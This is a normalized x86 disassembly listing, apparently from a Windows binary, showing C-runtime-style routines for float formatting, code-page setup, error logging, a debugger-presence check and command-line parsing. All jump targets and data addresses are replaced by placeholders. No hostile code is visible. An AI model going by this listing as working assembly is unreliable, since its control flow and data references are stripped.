mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
test al 0x4
je r-xdata
test al 0x8
je r-xdata
push [ rw-data ]
push [ rw-data ]
mov dx [ ebx + 0x8 ]
push edx
push [ ebx + 0x4 ]
push [ ebx ]
push 0x1
call sub_4ccec4
add esp 0x18
fstp [ esi ]
fwait
jmp r-xdata
mov eax rw-data
fld [ eax ]
fstp [ ebp - 0x8 ]
fwait
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov cx [ ebx + 0x8 ]
push ecx
push [ ebx + 0x4 ]
push [ ebx ]
push 0x0
call sub_4ccec4
add esp 0x18
fstp [ esi ]
fwait
mov ecx [ ebx ]
mov [ esi ] ecx
mov ecx [ ebx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov cx [ ebx + 0x8 ]
mov [ esi + 0x8 ] cx
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4ce1ec
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] 0xa
mov eax [ ebp + 0x18 ]
sub eax 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
fld [ edx ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
sub eax 0x4
je r-xdata
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] edx
mov bx [ eax + 0x8 ]
mov edx ebx
and dx 0x7fff
mov [ eax + 0x8 ] dx
test bh 0x80
setne al
and eax 0x1
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_4ccd24
and ax 0x4700
pop ecx
cmp ax 0x4000
jne r-xdata
mov ecx [ ebp + 0x8 ]
fld [ ecx ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
sub eax 0x2
je r-xdata
cmp ax 0x500
jne r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0xc ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x8 ] edx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x4 ] dx
jmp r-xdata
cmp ax 0x100
jne r-xdata
mov eax 0x7fff
jmp r-xdata
cmp ebx 0x28
jle r-xdata
neg ebx
inc ebx
movzx eax bx
and eax 0x7fff
mov ecx [ ebp - 0x10 ]
add eax 0xffffc001
imul edx eax 0x4d10
mov eax edx
xor edx edx
mov dl [ ecx + 0x7 ]
add edx edx
and edx 0xff
mov ecx edx
lea edx [ ecx + edx * 8 ]
lea edx [ ecx + edx * 2 ]
lea edx [ ecx + edx * 4 ]
movsx edx dx
and edx 0xffff
add eax edx
mov ecx eax
sar ecx 0x10
test eax 0xffff
mov [ ebp - 0x14 ] ecx
je r-xdata
mov eax 0x7ffe
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
push 0x30
mov eax [ ebp + 0x14 ]
push eax
call sub_4c4d44
add esp 0xc
mov edx [ ebp + 0x14 ]
mov [ edx + ebx ] 0x0
mov eax 0x1
jmp r-xdata
mov ebx 0x28
mov edi [ ebp + 0xc ]
test edi edi
jg r-xdata
inc [ ebp - 0x14 ]
cmp edi 0x13
jle r-xdata
mov edi [ ebp - 0x14 ]
sub edi [ ebp + 0xc ]
test edi edi
jl r-xdata
mov esi edi
sub esi [ ebp - 0x14 ]
test esi esi
je r-xdata
mov edi 0x13
push edi
call sub_4cc9c8
pop ecx
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0xc ]
fld [ ebp - 0x20 ]
fucompp
fnstsw ax
sahf
jae r-xdata
mov ebx esi
test esi esi
jge r-xdata
lea ecx [ edi - 0x1 ]
push ecx
call sub_4cc9c8
pop ecx
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0xc ]
fld [ ebp - 0x20 ]
fucompp
fnstsw ax
sahf
jbe r-xdata
inc [ ebp - 0x14 ]
inc edi
cmp edi 0x13
jg r-xdata
cmp ebx 0x1344
jle r-xdata
mov ebx esi
neg ebx
test edi edi
jl r-xdata
dec [ ebp - 0x14 ]
dec edi
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
push ebx
call sub_4cc9c8
pop ecx
fstp [ ebp - 0x20 ]
fwait
test esi esi
jge r-xdata
mov ebx 0x1344
lea ecx [ ebp - 0xc ]
push ecx
lea eax [ ebp - 0xc ]
push eax
call sub_4ccd00
mov edx [ ebp + 0x14 ]
add esp 0x8
add edx edi
xor esi esi
mov ebx edx
mov [ ebp - 0x24 ] edx
mov [ ebx ] 0x0
dec ebx
test edi edi
jne r-xdata
movsx edx [ ebp - 0x2 ]
mov [ ebp - 0x2c ] edx
fild [ ebp - 0x2c ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
inc edi
movsx edx [ ebp - 0x2 ]
mov [ ebp - 0x28 ] edx
fild [ ebp - 0x28 ]
fld [ ebp - 0xc ]
fdivrp st1
fstp [ ebp - 0xc ]
fwait
dec edi
jmp r-xdata
fld [ ebp - 0x20 ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sub esi ebx
fld [ ebp - 0x20 ]
fld [ ebp - 0xc ]
fdivrp st1
fstp [ ebp - 0xc ]
fwait
add esi ebx
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_4cd160
pop ecx
movsx edx al
or esi edx
add eax 0x30
mov [ ebx ] al
dec ebx
dec edi
je r-xdata
mov eax [ ebp - 0x10 ]
movzx esi [ eax ]
and esi 0xff
xor esi 0x1
test esi esi
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
jmp r-xdata
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jg r-xdata
inc [ ebp - 0x14 ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp ebx 0x28
jle r-xdata
mov ebx [ ebp - 0x14 ]
sub ebx [ ebp + 0xc ]
inc [ ebp - 0x24 ]
mov [ ebx + 0x1 ] 0x31
mov edx [ ebp - 0x24 ]
mov [ edx ] 0x30
mov eax [ ebp - 0x24 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x24 ]
sub edx [ ebp + 0x14 ]
sub ebx edx
test ebx ebx
jle r-xdata
mov ebx 0x28
mov eax [ ebp - 0x14 ]
push ebx
push 0x30
mov ecx [ ebp - 0x24 ]
push ecx
call sub_4c4d44
add esp 0xc
mov eax [ ebp - 0x24 ]
mov [ eax + ebx ] 0x0
sub_4ce4c0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] 0xa
mov eax [ ebp + 0x18 ]
sub eax 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
fld [ edx ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
sub eax 0x4
je r-xdata
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] edx
mov bx [ eax + 0x8 ]
mov edx ebx
and dx 0x7fff
mov [ eax + 0x8 ] dx
test bh 0x80
setne al
and eax 0x1
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_4ccd24
and ax 0x4700
pop ecx
cmp ax 0x4000
jne r-xdata
mov ecx [ ebp + 0x8 ]
fld [ ecx ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
sub eax 0x2
je r-xdata
cmp ax 0x500
jne r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0xc ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x8 ] edx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x4 ] dx
jmp r-xdata
cmp ax 0x100
jne r-xdata
mov eax 0x7fff
jmp r-xdata
cmp ebx 0x28
jle r-xdata
neg ebx
inc ebx
movzx eax bx
and eax 0x7fff
mov ecx [ ebp - 0x10 ]
add eax 0xffffc001
imul edx eax 0x4d10
mov eax edx
xor edx edx
mov dl [ ecx + 0x7 ]
add edx edx
and edx 0xff
mov ecx edx
lea edx [ ecx + edx * 8 ]
lea edx [ ecx + edx * 2 ]
lea edx [ ecx + edx * 4 ]
movsx edx dx
and edx 0xffff
add eax edx
mov ecx eax
sar ecx 0x10
test eax 0xffff
mov [ ebp - 0x14 ] ecx
je r-xdata
mov eax 0x7ffe
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
push 0x30
mov eax [ ebp + 0x14 ]
push eax
call sub_4c4dd4
mov edx [ ebp + 0x14 ]
add esp 0xc
mov eax 0x1
mov [ edx + ebx * 2 ] 0x0
jmp r-xdata
mov ebx 0x28
mov edi [ ebp + 0xc ]
test edi edi
jg r-xdata
inc [ ebp - 0x14 ]
cmp edi 0x13
jle r-xdata
mov edi [ ebp - 0x14 ]
sub edi [ ebp + 0xc ]
test edi edi
jl r-xdata
mov esi edi
sub esi [ ebp - 0x14 ]
test esi esi
je r-xdata
mov edi 0x13
push edi
call sub_4cc9c8
pop ecx
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0xc ]
fld [ ebp - 0x20 ]
fucompp
fnstsw ax
sahf
jae r-xdata
mov ebx esi
test esi esi
jge r-xdata
lea ecx [ edi - 0x1 ]
push ecx
call sub_4cc9c8
pop ecx
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0xc ]
fld [ ebp - 0x20 ]
fucompp
fnstsw ax
sahf
jbe r-xdata
inc [ ebp - 0x14 ]
inc edi
cmp edi 0x13
jg r-xdata
cmp ebx 0x1344
jle r-xdata
mov ebx esi
neg ebx
test edi edi
jl r-xdata
dec [ ebp - 0x14 ]
dec edi
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
push ebx
call sub_4cc9c8
pop ecx
fstp [ ebp - 0x20 ]
fwait
test esi esi
jge r-xdata
mov ebx 0x1344
lea ecx [ ebp - 0xc ]
push ecx
lea eax [ ebp - 0xc ]
push eax
call sub_4ccd00
mov edx edi
add esp 0x8
add edx edx
xor esi esi
add edx [ ebp + 0x14 ]
mov ebx edx
mov [ ebp - 0x24 ] edx
mov [ ebx ] 0x0
sub ebx 0x2
test edi edi
jne r-xdata
movsx edx [ ebp - 0x2 ]
mov [ ebp - 0x2c ] edx
fild [ ebp - 0x2c ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
inc edi
movsx edx [ ebp - 0x2 ]
mov [ ebp - 0x28 ] edx
fild [ ebp - 0x28 ]
fld [ ebp - 0xc ]
fdivrp st1
fstp [ ebp - 0xc ]
fwait
dec edi
jmp r-xdata
fld [ ebp - 0x20 ]
fld [ ebp - 0xc ]
fmulp st1
fstp [ ebp - 0xc ]
fwait
sub esi ebx
fld [ ebp - 0x20 ]
fld [ ebp - 0xc ]
fdivrp st1
fstp [ ebp - 0xc ]
fwait
add esi ebx
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_4cd160
pop ecx
movsx edx al
or esi edx
movsx ecx al
add cx 0x30
mov [ ebx ] cx
sub ebx 0x2
dec edi
je r-xdata
mov eax [ ebp - 0x10 ]
movzx esi [ eax ]
and esi 0xff
xor esi 0x1
test esi esi
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
jmp r-xdata
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jg r-xdata
inc [ ebp - 0x14 ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp ebx 0x28
jle r-xdata
mov ebx [ ebp - 0x14 ]
sub ebx [ ebp + 0xc ]
add [ ebp - 0x24 ] 0x2
mov [ ebx + 0x2 ] 0x31
mov eax [ ebp - 0x24 ]
mov [ eax ] 0x30
mov eax [ ebp - 0x24 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x24 ]
sub edx [ ebp + 0x14 ]
sar edx 0x1
jns r-xdata
mov ebx 0x28
sub ebx edx
test ebx ebx
jle r-xdata
adc edx 0x0
mov eax [ ebp - 0x14 ]
push ebx
push 0x30
mov ecx [ ebp - 0x24 ]
push ecx
call sub_4c4dd4
add esp 0xc
mov eax [ ebp - 0x24 ]
mov [ eax + ebx * 2 ] 0x0
sub_4ce7b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
call GetOEMCP
mov esi eax
jmp r-xdata
cmp esi 0xfffffffc
jne r-xdata
call GetACP
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
mov esi [ eax ]
xor eax eax
mov edx rw-data
lea eax [ ebp - 0x14 ]
push eax
push esi
call GetCPInfo
test eax eax
jne r-xdata
mov [ edx ] 0x0
inc eax
inc edx
cmp eax 0x101
jl r-xdata
test esi esi
je r-xdata
push rw-data
call sub_4ceb58
pop ecx
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ ebp - 0x14 ] 0x1
jbe r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0xe ]
jmp r-xdata
mov al [ ecx ]
test al al
je r-xdata
cmp esi 0x3a4
jne r-xdata
cmp [ ecx + 0x1 ] 0x0
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
mov eax 0x40
mov edx rw-data
and eax 0xff
lea edx [ eax + rw-data ]
jmp r-xdata
xor eax eax
or [ edx ] 0x8
inc eax
inc edx
cmp eax 0x7e
jle r-xdata
mov eax 0x80
mov edx rw-data
xor ebx ebx
mov bl [ ecx + 0x1 ]
cmp eax ebx
jle r-xdata
or [ edx ] 0x8
inc eax
inc edx
cmp eax 0xfc
jle r-xdata
xor eax eax
mov al [ rw-data ]
lea edx [ eax + rw-data ]
jmp r-xdata
mov [ edx ] 0x4
inc eax
inc edx
add ecx 0x2
xor ecx ecx
mov cl [ rw-data ]
cmp eax ecx
jle r-xdata
or [ edx ] 0x1
inc eax
inc edx
xor eax eax
mov al [ rw-data ]
lea edx [ eax + rw-data ]
jmp r-xdata
xor ecx ecx
mov cl [ rw-data ]
cmp eax ecx
jle r-xdata
or [ edx ] 0x2
inc eax
inc edx
sub_4ce904
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xff
jbe r-xdata
push eax
call sub_4ca2d8
pop ecx
pop ebp
retn
xor eax eax
pop ebp
retn
sub_4ce920
push ebp
mov ebp esp
push ebx
push esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor edx edx
xor ebx ebx
mov bl [ eax ]
cmp ecx ebx
jne r-xdata
cmp [ eax + 0x1 ] 0x0
jne r-xdata
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
mov edx eax
xor ebx ebx
mov bl [ eax ]
shl ebx 0x8
movzx esi [ eax + 0x1 ]
or ebx esi
cmp ecx ebx
jne r-xdata
inc eax
test ecx ecx
jne r-xdata
xor ebx ebx
mov bl [ eax ]
test [ ebx + rw-data ] 0x4
je r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
inc eax
jmp r-xdata
mov edx eax
mov edx eax
jmp r-xdata
sub_4ce978
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov [ ebx ] 0x0
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
add [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x4 ]
mov esi [ eax - 0x4 ]
test esi esi
jne r-xdata
push ebx
call sub_4c4e7c
pop ecx
mov edi [ ebp + 0xc ]
sub edi eax
dec edi
test edi edi
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push esi
push ebx
call sub_4c4ed8
add esp 0xc
sub_4ce9c0
push ebp
mov ebp esp
push 0x0
push rw-data
mov eax [ ebp + 0xc ]
push eax
push rw-data
mov edx [ ebp + 0x8 ]
push edx
push rw-data
push 0xf6
push rw-data
call sub_4ce978
add esp 0x20
push rw-data
call sub_4c4e7c
pop ecx
add eax rw-data
push eax
mov ecx [ ebp + 0x10 ]
push ecx
call sub_4cd054
add esp 0x8
push rw-data
call sub_4ceb58
pop ecx
call sub_4ced34
pop ebp
retn
sub_4cea20
add esp 0xfffffff0
push esp
call GetLocalTime
movzx eax [ esp + 0xe ]
push eax
movzx edx [ esp + 0x10 ]
push edx
movzx ecx [ esp + 0x12 ]
push ecx
movzx eax [ esp + 0x14 ]
push eax
movzx edx [ esp + 0x10 ]
push edx
movzx ecx [ esp + 0x1a ]
push ecx
movzx eax [ esp + 0x1a ]
push eax
push rw-data
push rw-data
call wsprintfA
add esp 0x24
mov eax rw-data
add esp 0x10
retn
sub_4cea70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax [ ebp + 0x8 ]
push eax
call CreateFileA
mov ebx eax
test eax eax
jne r-xdata
call sub_4cea20
mov esi eax
lea eax [ ebp - 0x4 ]
push 0x0
push eax
push esi
call sub_4c4e7c
pop ecx
push eax
push esi
push ebx
call WriteFile
push 0x0
lea edx [ ebp - 0x4 ]
push edx
push edi
call sub_4c4e7c
pop ecx
push eax
push edi
push ebx
call WriteFile
push ebx
call CloseHandle
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4ceadc
push ebx
push esi
call GetLastError
mov esi eax
call sub_4cfdac
mov ebx eax
push esi
add ebx 0xc
call SetLastError
mov eax ebx
pop esi
pop ebx
retn
sub_4ceb10
push ecx
xor eax eax
mov [ esp ] eax
call GetVersion
shr eax 0x10
and ax 0xffff
movzx edx ax
test dh 0x80
jne r-xdata
mov edx esp
push edx
push sub_4ceafc
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ esp ] 0x0
je r-xdata
mov eax 0x2000
pop edx
retn
mov eax 0x1000
mov eax 0x2000
jmp r-xdata
pop edx
retn
sub_4ceb58
push ebp
mov ebp esp
add esp 0xffffff7c
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
push esi
call [ rw-data ]
pop ecx
push 0xfffffff4
call GetStdHandle
mov ebx eax
lea eax [ ebp - 0x4 ]
push 0x0
push eax
push 0x2
push rw-data
push ebx
call WriteFile
push 0x0
lea edx [ ebp - 0x4 ]
push edx
push esi
call sub_4c4e7c
pop ecx
push eax
push esi
push ebx
call WriteFile
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x2
push rw-data
push ebx
call WriteFile
jmp r-xdata
push 0x80
lea eax [ ebp - 0x84 ]
push eax
push 0x0
call GetModuleFileNameA
push 0x5c
lea edx [ ebp - 0x84 ]
push edx
call sub_4ce920
add esp 0x8
mov ebx eax
test eax eax
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
inc ebx
push 0x3a
lea edx [ ebp - 0x84 ]
push edx
call sub_4ce920
add esp 0x8
mov ebx eax
test eax eax
jne r-xdata
push esi
push eax
call sub_4cea70
add esp 0x8
lea ebx [ ebp - 0x84 ]
jmp r-xdata
call sub_4ceb10
or eax 0x10010
push eax
push ebx
push esi
push 0x0
call MessageBoxA
jmp r-xdata
sub_4cecc4
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
call IsDebuggerPresent
test eax eax
je r-xdata
call sub_4cecb0
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x2c ]
mov ebx [ ebp - 0x28 ]
pop ebp
retn
push 0x0
push 0x0
push 0x0
push 0x40000015
call RaiseException
sub_4ced48
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4cfae0
test ebx ebx
jne r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
call sub_4cfaf0
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
call sub_4cfa74
call [ rw-data ]
jmp r-xdata
call [ rw-data ]
call sub_4cfaf0
mov edx [ ebp + 0x10 ]
push edx
call sub_4cf988
call [ rw-data ]
call [ rw-data ]
cmp [ ebp + 0xc ] 0x0
jne r-xdata
sub_4cee64
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
xor edx edx
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov ecx [ rw-data ]
push ecx
call sub_4c4fe8
pop ecx
mov ebx eax
mov [ rw-data ] ebx
push sub_4cef20
mov eax [ rw-data ]
push eax
push ebx
call [ rw-data ]
add esp 0xc
test eax eax
je r-xdata
xor edx edx
xor ecx ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
push 0x0
push 0x0
call sub_4cef20
add esp 0x8
dec [ rw-data ]
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
mov edx [ rw-data ]
mov [ rw-data ] edx
sub_4ceeec
call [ rw-data ]
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call sub_4c429c
pop ecx
mov edx [ rw-data ]
push edx
call sub_4c429c
pop ecx
xor ecx ecx
mov [ rw-data ] ecx
sub_4cef20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
add [ rw-data ] 0x10
mov edx [ rw-data ]
shl edx 0x2
push edx
mov ecx [ rw-data ]
push ecx
call sub_4c42ac
add esp 0x8
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov ebx esi
push esi
call sub_4c4e7c
pop ecx
inc eax
push eax
call sub_4c428c
pop ecx
mov ebx eax
test eax eax
jne r-xdata
push rw-data
call sub_4cec84
pop ecx
xor eax eax
push esi
mov edi esi
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi ebx
xchg edi esi
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
jmp r-xdata
push rw-data
call sub_4cec84
pop ecx
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + edx * 4 ] ebx
inc [ rw-data ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4cefd0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
lea ebx [ ebp - 0x4 ]
lea esi [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call [ ebp + 0x10 ]
add esp 0x8
jmp r-xdata
mov ecx [ ebx ]
mov al [ ecx ]
cmp al 0x20
je r-xdata
inc [ ebx ]
cmp al 0x9
je r-xdata
mov edx [ ebx ]
cmp [ edx ] 0x22
jne r-xdata
mov ecx [ ebx ]
mov al [ ecx ]
cmp al 0x20
je r-xdata
inc [ ebx ]
jmp r-xdata
mov edx [ ebx ]
push edx
call sub_4c4e7c
pop ecx
inc eax
push eax
call sub_4c428c
pop ecx
mov [ esi ] eax
mov [ rw-data ] eax
test eax eax
jne r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebx ]
mov al [ ecx ]
cmp al 0x22
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x0
jne r-xdata
push rw-data
call sub_4cec84
pop ecx
jmp r-xdata
test al al
jne r-xdata
mov edx [ ebx ]
cmp [ edx ] 0x22
jne r-xdata
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc [ ebx ]
inc [ ebx ]
jmp r-xdata
inc [ ebx ]
mov eax [ ebx ]
mov al [ eax ]
cmp al 0x20
je r-xdata
inc [ ebx ]
cmp al 0x9
je r-xdata
mov edx [ ebx ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ esi ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebx ]
mov al [ eax ]
cmp al 0x20
je r-xdata
mov edx [ esi ]
mov [ edx ] 0x0
inc [ esi ]
test edi edi
je r-xdata
cmp al 0x9
je r-xdata
push 0x0
mov edx [ ebp - 0xc ]
push edx
call [ ebp + 0x10 ]
add esp 0x8
mov ecx [ ebp + 0x10 ]
push ecx
mov eax [ ebp - 0xc ]
push eax
call [ rw-data ]
add esp 0x8
jmp r-xdata
test al al
jne r-xdata
inc [ ebx ]
mov ecx [ ebx ]
cmp [ ecx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
mov ecx [ ebx ]
mov al [ ecx ]
cmp al 0x2a
je r-xdata
inc [ ebx ]
jmp r-xdata
mov edi 0x1
cmp al 0x3f
jne r-xdata
mov eax [ ebx ]
mov al [ eax ]
cmp al 0x22
je r-xdata
push ebx
push esi
call sub_4cf144
add esp 0x8
mov edx [ ebx ]
cmp [ edx ] 0x22
jne r-xdata
test al al
jne r-xdata
inc [ ebx ]
jmp r-xdata
push ebx
push esi
call sub_4cf144
add esp 0x8
sub_4cf144
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx ] 0x5c
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ecx + 0x1 ] 0x22
jne r-xdata
mov esi [ eax ]
mov cl [ esi ]
xor ebx ebx
mov bl cl
test [ ebx + rw-data ] 0x4
je r-xdata
mov ecx [ eax ]
cmp [ ecx ] 0x5c
jne r-xdata
mov ecx [ edx ]
mov [ ecx ] 0x22
add [ eax ] 0x2
jmp r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
mov cl [ ecx ]
mov [ ebx ] cl
inc [ eax ]
cmp [ esi + 0x1 ] 0x0
je r-xdata
cmp [ ecx + 0x1 ] 0x5c
jne r-xdata
inc [ edx ]
pop esi
pop ebx
pop ebp
retn
mov ebx [ edx ]
mov [ ebx ] cl
inc [ eax ]
inc [ edx ]
mov ecx [ edx ]
mov [ ecx ] 0x5c
add [ eax ] 0x2
jmp r-xdata
sub_4cf1b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
lea ebx [ ebp - 0x4 ]
lea esi [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call [ ebp + 0x10 ]
add esp 0x8
jmp r-xdata
mov ecx [ ebx ]
mov ax [ ecx ]
cmp ax 0x20
je r-xdata
add [ ebx ] 0x2
cmp ax 0x9
je r-xdata
mov edx [ ebx ]
cmp [ edx ] 0x22
jne r-xdata
mov ecx [ ebx ]
mov ax [ ecx ]
cmp ax 0x20
je r-xdata
add [ ebx ] 0x2
jmp r-xdata
mov edx [ ebx ]
push edx
call sub_4c5124
pop ecx
add eax eax
add eax 0x2
push eax
call sub_4c428c
pop ecx
mov [ esi ] eax
mov [ rw-data ] eax
test eax eax
jne r-xdata
cmp ax 0x9
je r-xdata
mov ecx [ ebx ]
mov ax [ ecx ]
cmp ax 0x22
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x0
jne r-xdata
push rw-data
call sub_4cec84
pop ecx
jmp r-xdata
test ax ax
jne r-xdata
mov edx [ ebx ]
cmp [ edx ] 0x22
jne r-xdata
test ax ax
jne r-xdata
xor edi edi
jmp r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add [ ebx ] 0x2
add [ ebx ] 0x2
jmp r-xdata
add [ ebx ] 0x2
mov eax [ ebx ]
mov ax [ eax ]
cmp ax 0x20
je r-xdata
add [ ebx ] 0x2
cmp ax 0x9
je r-xdata
mov edx [ ebx ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ esi ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebx ]
mov ax [ eax ]
cmp ax 0x20
je r-xdata
mov edx [ esi ]
mov [ edx ] 0x0
add [ esi ] 0x2
test edi edi
je r-xdata
cmp ax 0x9
je r-xdata
push 0x0
mov edx [ ebp - 0xc ]
push edx
call [ ebp + 0x10 ]
add esp 0x8
mov ecx [ ebp + 0x10 ]
push ecx
mov eax [ ebp - 0xc ]
push eax
call [ rw-data ]
add esp 0x8
jmp r-xdata
test ax ax
jne r-xdata
add [ ebx ] 0x2
mov ecx [ ebx ]
cmp [ ecx ] 0x0
je r-xdata
cmp ax 0x22
jne r-xdata
mov ecx [ ebx ]
mov ax [ ecx ]
cmp ax 0x2a
je r-xdata
add [ ebx ] 0x2
jmp r-xdata
mov edi 0x1
cmp ax 0x3f
jne r-xdata
mov eax [ ebx ]
mov ax [ eax ]
cmp ax 0x22
je r-xdata
push ebx
push esi
call sub_4cf368
add esp 0x8
mov edx [ ebx ]
cmp [ edx ] 0x22
jne r-xdata
test ax ax
jne r-xdata
add [ ebx ] 0x2
